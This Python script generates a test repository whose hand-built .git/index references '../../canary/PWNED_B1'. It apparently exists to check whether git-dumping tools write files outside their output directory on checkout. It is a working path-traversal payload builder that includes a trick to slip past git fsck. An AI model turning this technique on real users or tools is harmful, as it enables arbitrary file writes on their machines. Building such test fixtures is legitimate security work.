"""Generate a minimal git repo with a hand-crafted .git/index whose
entries reference ``../../canary/PWNED_B1``.

When a pillager runs ``git checkout`` or ``git checkout-index --all``
against the recovered repository, git materializes blobs at the
attacker-controlled paths, writing outside the output directory
(Driver Tom 2021).
"""

from __future__ import annotations

import hashlib
import shutil
import struct
import zlib
from pathlib import Path

HERE = Path(__file__).resolve().parent
PAYLOAD = HERE / "payload"

EVIL_PATH = "../../canary/PWNED_B1"
BLOB_CONTENT = b"PWNED via .git/index path traversal\n"


def _write_object(git_dir: Path, content: bytes, obj_type: str) -> str:
    body = f"{obj_type} {len(content)}".encode() + b"\0" + content
    sha = hashlib.sha1(body).hexdigest()
    dst = git_dir / "objects" / sha[:2] / sha[2:]
    dst.parent.mkdir(parents=True, exist_ok=True)
    dst.write_bytes(zlib.compress(body))
    return sha


def _build_index(entries: list[tuple[int, str, str]]) -> bytes:
    """Return raw bytes of a git index v2.

    entries: list of (mode, sha_hex, path).
    """
    body = b"DIRC" + struct.pack(">II", 2, len(entries))
    for mode, sha_hex, path in entries:
        path_b = path.encode("utf-8")
        flags = min(len(path_b), 0xFFF)
        # struct: 10 x uint32 stat fields, 20 bytes sha, uint16 flags
        entry = struct.pack(
            ">10I20sH",
            0, 0, 0, 0, 0, 0, mode, 0, 0, len(BLOB_CONTENT),
            bytes.fromhex(sha_hex),
            flags,
        )
        entry += path_b + b"\0"
        # pad to 8-byte boundary including the NUL
        while (len(entry) % 8) != 0:
            entry += b"\0"
        body += entry
    body += hashlib.sha1(body).digest()
    return body


def main() -> None:
    if PAYLOAD.exists():
        shutil.rmtree(PAYLOAD)
    git_dir = PAYLOAD / ".git"
    git_dir.mkdir(parents=True)

    blob_sha = _write_object(git_dir, BLOB_CONTENT, "blob")

    # Tree entry uses a *safe* path so ``git fsck`` doesn't reject it.
    # The malicious path only appears in the index, which fsck doesn't
    # validate the same way it validates trees.
    tree_content = b"100644 hello.txt\x00" + bytes.fromhex(blob_sha)
    tree_sha = _write_object(git_dir, tree_content, "tree")
    commit_content = (
        f"tree {tree_sha}\n"
        f"author Evil <evil@example.com> 0 +0000\n"
        f"committer Evil <evil@example.com> 0 +0000\n\n"
        f"init\n"
    ).encode()
    commit_sha = _write_object(git_dir, commit_content, "commit")

    (git_dir / "HEAD").write_text("ref: refs/heads/main\n")
    refs = git_dir / "refs" / "heads"
    refs.mkdir(parents=True)
    (refs / "main").write_text(commit_sha + "\n")
    (git_dir / "config").write_text(
        "[core]\n"
        "\trepositoryformatversion = 0\n"
        "\tfilemode = true\n"
        "\tbare = false\n"
        "\tlogallrefupdates = true\n"
    )
    (git_dir / "objects" / "info").mkdir(parents=True, exist_ok=True)
    (git_dir / "objects" / "info" / "packs").write_text("")

    # The poisoned index — what makes this test interesting.
    (git_dir / "index").write_bytes(_build_index([(0o100644, blob_sha, EVIL_PATH)]))

    print(f"Built B1 payload at {PAYLOAD}")


if __name__ == "__main__":
    main()
